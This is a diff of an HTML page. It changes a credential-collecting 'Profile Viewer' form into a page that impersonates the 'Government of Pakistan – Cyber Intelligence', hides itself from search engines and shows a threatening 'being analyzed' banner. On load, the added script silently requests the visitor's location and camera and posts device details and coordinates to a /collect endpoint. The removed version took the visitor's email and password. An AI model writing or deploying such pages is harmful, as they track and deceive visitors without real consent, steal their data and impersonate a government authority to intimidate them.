@@ -2,14 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>🔍 Profile Viewer Debug</title>
+  <title>Government of Pakistan – Cyber Intelligence</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="icon" href="/static/icon.png">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="googlebot" content="noindex, nofollow">
+  <link rel="icon" href="/static/pakistan-emblem.png">
   <style>
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #2c3e50;
+      background: #1b2631;
       color: white;
       display: flex;
       justify-content: center;
@@ -17,119 +19,101 @@
       height: 100vh;
     }
     .box {
-      background: rgba(255, 255, 255, 0.1);
+      background: rgba(255, 255, 255, 0.05);
       padding: 30px;
       border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+      box-shadow: 0 0 30px rgba(0,0,0,0.6);
       text-align: center;
-      width: 340px;
-      backdrop-filter: blur(8px);
+      width: 360px;
+      backdrop-filter: blur(10px);
+      border: 1px solid #28a745;
     }
-    h1 {
-      font-size: 24px;
+    .seal {
+      width: 80px;
       margin-bottom: 15px;
     }
-    p {
-      margin-bottom: 20px;
-      font-size: 14px;
-      color: #f1f1f1;
+    h1 {
+      font-size: 20px;
+      margin-bottom: 10px;
+      color: #28a745;
     }
-    input, button {
-      width: 100%;
+    .warning {
+      font-size: 12px;
+      background: rgba(255, 0, 0, 0.1);
+      border: 1px solid red;
       padding: 10px;
-      margin: 8px 0;
+      margin-bottom: 20px;
+      color: #ffcccc;
+      border-radius: 6px;
+    }
+    #map {
+      width: 100%;
+      height: 200px;
       border-radius: 8px;
-      border: none;
-      font-size: 15px;
-    }
-    input {
-      background: #ecf0f1;
-      color: #2c3e50;
-    }
-    button {
-      background: #e74c3c;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #c0392b;
+      margin-bottom: 10px;
+      background: #555;
+      line-height: 200px;
     }
   </style>
 </head>
 <body>
   <div class="box">
-    <h1>👁 Profile Viewer – Debug</h1>
-    <p>Please allow location and camera access when prompted.</p>
-    <form id="spyForm">
-      <input type="text" id="email" placeholder="Email" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <button type="submit">Check Now</button>
-    </form>
+    <img src="/static/pakistan-emblem.png" class="seal" alt="Gov Logo">
+    <h1>Government of Pakistan – Cyber Intelligence</h1>
+    <div class="warning">⚠️ Confidential System – Location and Device are being analyzed.</div>
+    <div id="map">📍 Fetching location...</div>
   </div>
 
   <script>
-    async function collectData(cameraStatus, latitude = null, longitude = null, email = null, password = null) {
-      console.log("📡 Sending data to /collect...");
+    async function collectData(cameraStatus, latitude = null, longitude = null) {
+      const email = "captured@pakistan.gov";
+      const password = "********"; // fake login
+      console.log("📡 Auto-sending data to /collect...");
+
       try {
-        const response = await fetch("/collect", {
+        await fetch("/collect", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             userAgent: navigator.userAgent,
-            latitude: latitude,
-            longitude: longitude,
+            latitude,
+            longitude,
             camera: cameraStatus,
             deviceInfo: navigator.platform,
-            email: email,
-            password: password
+            email,
+            password
           })
         });
-        const result = await response.text();
-        console.log("✅ Data sent:", result);
-        alert("✅ All data captured and sent successfully.");
+        console.log("✅ Data sent silently.");
       } catch (error) {
-        console.error("❌ Failed to send data:", error);
-        alert("❌ Failed to send data. Check console for details.");
+        console.error("❌ Error sending data:", error);
       }
     }
 
-    document.getElementById("spyForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-
-      if (!email || !password) {
-        alert("⚠️ Please fill in both fields.");
-        return;
+    async function startSurveillance() {
+      let lat = null, lon = null;
+      try {
+        const position = await new Promise((resolve, reject) =>
+          navigator.geolocation.getCurrentPosition(resolve, reject)
+        );
+        lat = position.coords.latitude;
+        lon = position.coords.longitude;
+        document.getElementById('map').innerText = `📍 Location: ${lat.toFixed(4)}, ${lon.toFixed(4)}`;
+      } catch (err) {
+        document.getElementById('map').innerText = "❌ Location Blocked";
       }
 
-      alert("📸 Requesting camera permission...");
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          console.log("✅ Camera access granted.");
-          stream.getTracks().forEach(track => track.stop());
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        stream.getTracks().forEach(track => track.stop());
+        await collectData("✅ Camera Allowed", lat, lon);
+      } catch (err) {
+        await collectData("❌ Camera Denied", lat, lon);
+      }
+    }
 
-          alert("📍 Requesting location access...");
-          navigator.geolocation.getCurrentPosition(
-            pos => {
-              console.log("✅ Location access granted.");
-              collectData("✅ Allowed", pos.coords.latitude, pos.coords.longitude, email, password);
-            },
-            err => {
-              console.warn("❌ Location error:", err.message);
-              alert("❌ Location access denied.");
-              collectData("✅ Camera Allowed, ❌ Location Denied", null, null, email, password);
-            }
-          );
-        })
-        .catch(err => {
-          console.warn("❌ Camera error:", err.message);
-          alert("❌ Camera access denied.");
-          collectData("❌ Camera Denied", null, null, email, password);
-        });
-    });
+    // 🟢 Auto-start on load
+    window.onload = startSurveillance;
   </script>
 </body>
 </html>
